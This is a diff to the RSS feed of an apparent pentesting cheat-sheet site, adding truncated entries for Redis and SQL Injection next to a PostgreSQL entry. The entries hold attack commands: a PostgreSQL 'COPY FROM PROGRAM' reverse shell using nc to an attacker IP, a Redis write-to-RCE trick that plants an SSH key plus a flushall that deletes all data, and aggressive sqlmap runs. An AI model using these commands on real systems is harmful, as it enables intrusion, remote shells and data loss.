@@ -99,6 +99,20 @@
       <description>Connect psql -h 127.0.0.1 -U &amp;lt;USER&amp;gt; -p 5432 -d &amp;lt;DB_NAME&amp;gt; psql &amp;#39;postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt;&amp;#39; Basic # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables in current database \dt # Dump data from table select * from &amp;lt;TABLE_NAME&amp;gt;; # Insert data into table (e.g) insert into &amp;lt;TABLE_NAME&amp;gt; (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; &amp;amp;&amp;#39; </description>
     </item>
     <item>
+      <title>Redis</title>
+      <link>https://tldrbins.github.io/redis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/redis/</guid>
+      <description>Basic # Connect redis-cli -h 127.0.0.1 # Provide password auth &amp;lt;PASSWORD&amp;gt; # List current keys keys * # Add key incr key # Get key value get key Abuse #1: Arbitrary write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/&amp;lt;USER&amp;gt;/.</description>
+    </item>
+    <item>
+      <title>SQL Injection</title>
+      <link>https://tldrbins.github.io/sql_injection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sql_injection/</guid>
+      <description>sqlmap # In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
+    </item>
+    <item>
       <title>SQLite</title>
       <link>https://tldrbins.github.io/sqlite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
